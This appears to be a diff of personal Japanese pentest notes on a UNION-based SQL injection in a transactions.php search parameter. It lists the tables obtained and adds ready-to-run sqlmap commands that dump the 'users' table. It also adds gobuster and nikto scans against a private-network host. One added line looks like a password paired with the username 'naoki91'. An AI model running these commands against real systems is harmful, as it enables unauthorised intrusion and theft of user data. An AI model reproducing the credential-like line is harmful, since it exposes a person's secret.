@@ -1,5 +1,8 @@
 pythonをインストール
 sqlmapをインストール
+13Ltn@fnO*C@	naoki91
+
+
 
 http://aaaaaa/transactions.php?findStr=ATMでSQLi union
 
@@ -16,3 +19,9 @@ transactions
 user_profile
 users
 というテーブルを取得
+cd C:\tools\sqlmap
+python sqlmap.py -r C:\tools\sqlmap\dummy1.req -D public --technique=U --threads=10 --level=3 --risk=2 -T users --dump --batch
+wsl -d kali-linux -- gobuster dir -u http://192.168.1.59 -w /home/kali/SecLists/Discovery/Web-Content/raft-large-files.txt -x php -t 80 -b 404 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
+wsl -d kali-linux -- nikto -h http://192.168.1.59
+python sqlmap.py -r C:\tools\sqlmap\test.req -D public --technique=U --threads=10 --level=3 --risk=2 -T users --dump --batch
+wsl -d kali-linux -- gobuster dir -u http://192.168.1.59 -w /usr/share/wordlists/wfuzz/general/common.txt -x php -t 80 -b 404 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
